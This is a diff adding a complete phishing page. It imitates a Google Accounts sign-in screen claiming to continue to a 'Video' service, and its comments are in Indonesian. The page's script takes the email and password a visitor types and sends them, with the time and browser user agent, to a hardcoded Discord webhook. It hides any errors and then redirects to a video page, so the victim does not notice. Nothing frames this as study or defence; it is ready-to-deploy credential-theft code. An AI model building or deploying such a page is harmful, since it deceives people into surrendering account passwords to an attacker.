@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Accounts</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+  background: #fff;
+  color: #202124;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+.google-card {
+  background: #fff;
+  border: 1px solid #dadce0;
+  border-radius: 8px;
+  padding: 48px 40px 36px;
+  max-width: 450px;
+  width: 100%;
+}
+.google-logo {
+  text-align: center;
+  font-size: 28px;
+  font-weight: 500;
+  margin-bottom: 16px;
+}
+.google-card h1 {
+  font-size: 24px;
+  font-weight: 400;
+  text-align: center;
+  margin-bottom: 8px;
+}
+.google-sub {
+  font-size: 16px;
+  text-align: center;
+  margin-bottom: 32px;
+}
+.input-group { margin-bottom: 16px; }
+.input-group input {
+  width: 100%;
+  padding: 13px 15px;
+  font-size: 16px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  outline: none;
+}
+.input-group input:focus { border-color: #1a73e8; border-width: 2px; }
+.google-actions { margin-bottom: 32px; }
+.google-actions-btns {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.google-btn-text {
+  color: #1a73e8;
+  font-size: 14px;
+  text-decoration: none;
+  font-weight: 500;
+}
+.google-btn-primary {
+  background: #1a73e8;
+  color: #fff;
+  border: none;
+  padding: 10px 24px;
+  font-size: 14px;
+  font-weight: 500;
+  border-radius: 4px;
+  cursor: pointer;
+}
+.google-btn-primary:hover { background: #1765cc; }
+</style>
+</head>
+<body>
+  <div class="google-card">
+    <div class="google-logo">
+      <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+    </div>
+    <h1>Sign in</h1>
+    <p class="google-sub">to continue to <strong>Video</strong></p>
+    <form id="loginForm">
+      <div class="input-group">
+        <input type="email" id="email" placeholder="Email or phone" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Enter your password" required>
+      </div>
+      <div class="google-actions">
+        <a href="#" class="google-btn-text">Forgot email?</a>
+      </div>
+      <div class="google-actions-btns">
+        <a href="index.html" class="google-btn-text">Back</a>
+        <button type="submit" class="google-btn-primary">Next</button>
+      </div>
+    </form>
+  </div>
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var email = document.getElementById('email').value.trim();
+  var password = document.getElementById('password').value;
+
+  // ===== ISI WEBHOOK DISCORD DI SINI =====
+  var WEBHOOK_URL = "https://discord.com/api/webhooks/1552968305424207892/u_cpC_lz_LzjzomcEeKWofOl-i7s89o7ebgSmMMrHtyQ8x8c4fKq3y_593fLR8T4frRV";
+
+  var payload = {
+    embeds: [{
+      title: "Login Baru",
+      color: 4285,
+      fields: [
+        { name: "Email", value: email || "-" },
+        { name: "Password", value: password || "-" },
+        { name: "Waktu", value: new Date().toLocaleString('id-ID') },
+        { name: "User Agent", value: navigator.userAgent.slice(0, 200) }
+      ]
+    }]
+  };
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(function(){});
+
+  var btn = document.querySelector('button[type="submit"]');
+  btn.disabled = true;
+  btn.textContent = '...';
+  setTimeout(function() { window.location.href = 'video.html'; }, 900);
+});
+</script>
+</body>
+</html>
